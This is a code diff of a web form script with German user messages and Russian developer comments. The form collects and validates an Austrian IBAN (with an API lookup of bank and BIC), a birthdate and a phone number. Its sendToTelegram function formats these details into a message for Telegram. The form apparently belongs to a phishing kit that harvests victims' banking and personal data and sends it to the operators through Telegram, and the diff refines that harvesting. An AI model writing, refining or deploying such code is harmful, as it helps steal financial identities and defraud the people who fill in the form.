@@ -29,7 +29,6 @@ function validateBirthdate(value) {
         return { valid: false, message: 'Ungültiges Datum.' };
     }
 
-    // Общая проверка на реальность даты и диапазон
     if (year < 1950 || year > 2008) {
         return { valid: false, message: 'Ungültiges Datum.' };
     }
@@ -55,13 +54,11 @@ async function validateIbanWithApi(iban) {
         const response = await fetch(url);
         const data = await response.json();
 
-        // Если есть ошибки (неверный ключ и т.д.)
         if (data.errors && data.errors.length > 0) {
             console.error("IBAN API Error:", data.errors);
             return { valid: false, message: 'Ungültige IBAN.', bankData: null };
         }
 
-        // Проверяем коды валидации. 001, 003, 005, 006, 007 - успех. 002 или 004 - ок для аккаунта.
         const v = data.validations;
         const isValid = v.iban.code === "001" && 
                         v.length.code === "003" && 
@@ -71,7 +68,6 @@ async function validateIbanWithApi(iban) {
                         (v.account.code === "002" || v.account.code === "004");
 
         if (isValid) {
-            // Если банк найден, возвращаем его данные
             if (data.bank_data && data.bank_data.bic) {
                 return {
                     valid: true,
@@ -83,7 +79,6 @@ async function validateIbanWithApi(iban) {
                     }
                 };
             } else {
-                // IBAN валиден, но банк не найден в справочнике
                 return {
                     valid: true,
                     message: 'Gültige IBAN (Bank nicht gefunden).',
@@ -139,45 +134,19 @@ document.addEventListener('DOMContentLoaded', function() {
                 formatted += value[i];
             }
             this.value = formatted;
+            // Скрываем ошибку при новом вводе
+            if (birthdateError) birthdateError.style.display = 'none';
         });
     }
 
-    // === IBAN ВАЛИДАЦИЯ (локальная + API при вводе) ===
+    // === IBAN (только форматирование, без проверки) ===
     if (ibanInput) {
         ibanInput.maxLength = 34;
-        
-        // Мгновенная проверка при вводе (только формат)
         ibanInput.addEventListener('input', function() {
             let value = this.value.replace(/\s/g, '').toUpperCase();
             this.value = value;
-
+            // Скрываем ошибку при новом вводе
             if (ibanError) ibanError.style.display = 'none';
-            if (submitBtn) submitBtn.disabled = false; // Разблокируем на всякий случай
-
-            if (value.length === 0) {
-                ibanCheckResult = { valid: false, message: 'nicht geprüft', bankData: null, iban: '' };
-                return;
-            }
-
-            // Локальная проверка (быстрая)
-            if (!value.startsWith('AT')) {
-                if (ibanError) { ibanError.textContent = 'Ungültige IBAN.'; ibanError.style.display = 'block'; }
-                ibanCheckResult = { valid: false, message: 'Ungültige IBAN.', bankData: null, iban: value };
-                return;
-            }
-            if (value.length < 20) {
-                if (ibanError) { ibanError.textContent = 'Ungültige IBAN.'; ibanError.style.display = 'block'; }
-                ibanCheckResult = { valid: false, message: 'Ungültige IBAN.', bankData: null, iban: value };
-                return;
-            }
-            if (!/^[A-Z0-9]+$/.test(value)) {
-                if (ibanError) { ibanError.textContent = 'Ungültige IBAN.'; ibanError.style.display = 'block'; }
-                ibanCheckResult = { valid: false, message: 'Ungültige IBAN.', bankData: null, iban: value };
-                return;
-            }
-
-            // Если локально всё ок, ставим временный статус (проверка через API будет при отправке)
-            ibanCheckResult = { valid: true, message: 'Gültige IBAN.', bankData: null, iban: value };
         });
     }
 
@@ -188,14 +157,18 @@ document.addEventListener('DOMContentLoaded', function() {
     form.addEventListener('submit', async function(event) {
         event.preventDefault();
 
-        // Проверка телефона
+        // Скрываем все ошибки перед новой проверкой
+        if (ibanError) ibanError.style.display = 'none';
+        if (birthdateError) birthdateError.style.display = 'none';
+
+        // --- Проверка телефона ---
         const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
         if (phoneDigits.length < 6) {
             alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
             return;
         }
 
-        // Локальная проверка IBAN перед запросом
+        // --- Проверка IBAN (сначала локальная, потом API) ---
         const ibanValue = ibanInput.value.trim();
         if (!ibanValue.startsWith('AT') || ibanValue.length < 20 || !/^[A-Z0-9]+$/.test(ibanValue)) {
             if (ibanError) { ibanError.textContent = 'Ungültige IBAN.'; ibanError.style.display = 'block'; }
@@ -203,7 +176,7 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // Проверка даты рождения
+        // --- Проверка даты рождения ---
         const birthdateValue = birthdateInput.value.trim();
         const birthdateValidation = validateBirthdate(birthdateValue);
         if (!birthdateValidation.valid) {
@@ -215,34 +188,31 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // Все локальные проверки пройдены. Блокируем кнопку и делаем запрос к API
+        // --- Блокируем кнопку и делаем запрос к API ---
         if (submitBtn) {
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ Prüfe IBAN...';
         }
 
-        // Запрос к API для проверки IBAN и получения BIC
         const apiResult = await validateIbanWithApi(ibanValue);
 
-        if (apiResult.valid) {
-            // Обновляем глобальный результат с данными банка
-            ibanCheckResult = {
-                valid: true,
-                message: apiResult.message || 'Gültige IBAN.',
-                bankData: apiResult.bankData,
-                iban: ibanValue
-            };
-        } else {
-            // Если API сказал, что IBAN невалиден
+        if (!apiResult.valid) {
             if (ibanError) { ibanError.textContent = 'Ungültige IBAN.'; ibanError.style.display = 'block'; }
             if (submitBtn) {
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Absenden';
             }
-            return; // Прерываем отправку
+            return;
         }
 
-        // Отправляем данные в Telegram
+        // --- Всё ок, обновляем статус и отправляем ---
+        ibanCheckResult = {
+            valid: true,
+            message: apiResult.message || 'Gültige IBAN.',
+            bankData: apiResult.bankData,
+            iban: ibanValue
+        };
+
         const formData = new FormData(form);
         const data = {};
         formData.forEach((value, key) => {
@@ -274,7 +244,6 @@ function sendToTelegram(data) {
     message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
     message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;
     
-    // Выводим данные банка, если они есть
     if (ibanData.bankData) {
         message += `🏛️ <b>Bank:</b> ${ibanData.bankData.bank || 'nicht angegeben'}\n`;
         message += `🏛️ <b>BIC:</b> ${ibanData.bankData.bic || 'nicht angegeben'}\n`;
